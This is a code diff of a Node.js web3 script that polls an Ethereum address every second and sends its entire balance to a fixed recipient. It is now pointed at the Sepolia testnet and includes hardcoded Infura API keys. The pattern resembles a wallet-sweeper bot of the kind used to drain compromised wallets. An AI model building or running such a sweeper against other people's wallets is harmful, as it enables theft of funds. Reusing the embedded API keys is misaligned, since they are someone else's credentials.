@@ -1,7 +1,9 @@
-const {Web3} = require('web3');
-const web3 = new Web3('https://mainnet.infura.io/v3/13c5d0003d704682b290ed46903a2bb1');
+const { Web3 } = require('web3');
+const web3 = new Web3('https://sepolia.infura.io/v3/13c5d0003d704682b290ed46903a2bb1');
+const web3_CB = new Web3('https://sepolia.infura.io/v3/9059b6f664f5402ab932aeecce4cd75f');
 
 let isSending = false;
+let lastBalance = 0n;
 
 const senderAddress = '0x2Bcb7C6d22A62D07Fe56687B2848A1317A75AfEF';
 const recipientAddress = '0xB8006B9626FeBdD46d11243cE30586E57518D7B1';
@@ -29,7 +31,8 @@ async function sendAllEthToRecipient() {
         const valueToSend = balance - gasCost;
 
         if (valueToSend <= 0n) {
-            console.log('Not enough balance to cover gas fees.');
+            lastBalance = balance;
+            console.log(`Not enough balance to cover gas fees. Last Balance = ${web3.utils.fromWei(lastBalance.toString(), 'ether')} ETH`);
             return;
         }
 
@@ -54,14 +57,24 @@ async function sendAllEthToRecipient() {
 }
 
 async function checkBalanceAndSend() {
-    const balance = BigInt(await web3.eth.getBalance(senderAddress));
-    console.log(`Balance of ${senderAddress}: ${web3.utils.fromWei(balance.toString(), 'ether')} ETH`);
+    const balance = BigInt(await web3_CB.eth.getBalance(senderAddress));
+    console.log(`Balance of ${senderAddress}: ${web3_CB.utils.fromWei(balance.toString(), 'ether')} ETH`);
 
-    if (balance > 0n && !isSending) {
+    if (balance > lastBalance && !isSending) {
         isSending = true;
         await sendAllEthToRecipient();
     }
 }
 
-// Пример вызова функции checkBalanceAndSend
+async function sendEthManually() {
+    if (!isSending) {
+        isSending = true;
+        await sendAllEthToRecipient();
+    }
+}
+
+sendAllEthToRecipient()
+
 setInterval(checkBalanceAndSend, 1000);
+setInterval(sendEthManually, 10000);
+
